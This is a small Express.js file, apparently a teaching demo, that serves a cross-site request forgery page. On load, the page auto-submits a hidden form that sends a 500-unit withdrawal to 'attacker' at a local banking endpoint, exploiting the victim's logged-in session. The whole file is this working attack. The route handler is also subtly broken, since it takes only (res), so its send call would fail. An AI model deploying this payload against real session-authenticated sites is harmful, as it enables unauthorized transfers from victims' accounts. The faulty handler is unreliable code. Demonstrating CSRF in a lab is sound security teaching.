const express = require('express');
const app = express();
const PORT = 3003;

// Repersents a basic attack script, typically would be clicked through a nefarious email 
// or website. Takes advantage of preauthenticated session.
app.get('/', (res) => {
  res.send(`
    <!DOCTYPE html>
    <html>
    <body onload="document.forms[0].submit()">
      <form action="http://localhost:3002/withdraw" method="POST">
        <input type="hidden" name="to" value="attacker">
        <input type="hidden" name="amount" value="500">
      </form>
    </body>
    </html>
  `);
});

app.listen(PORT, () => {
  console.log(`Attack server running on http://localhost:${PORT}`);
});